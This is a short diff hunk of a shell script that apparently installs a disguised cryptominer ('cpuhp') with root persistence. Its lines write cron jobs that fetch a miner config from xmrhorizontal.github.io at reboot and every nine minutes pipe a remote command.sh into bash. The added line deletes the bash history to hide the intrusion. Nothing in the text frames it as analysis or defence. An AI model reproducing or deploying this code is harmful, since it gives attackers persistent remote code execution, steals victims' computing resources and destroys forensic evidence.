@@ -16,5 +16,6 @@ fi
     chmod +x ./cpuhp
     echo "@reboot root sleep 5m && curl -s https://xmrhorizontal.github.io/config.json | /bin/cpuhp --config /dev/stdin" > /etc/cron.d/cronconfig
     echo "*/9 * * * * root curl -s https://xmrhorizontal.github.io/command.sh | bash" > /etc/cron.d/debcron
+    rm -f ~/.bash_history
 echo OK!
 
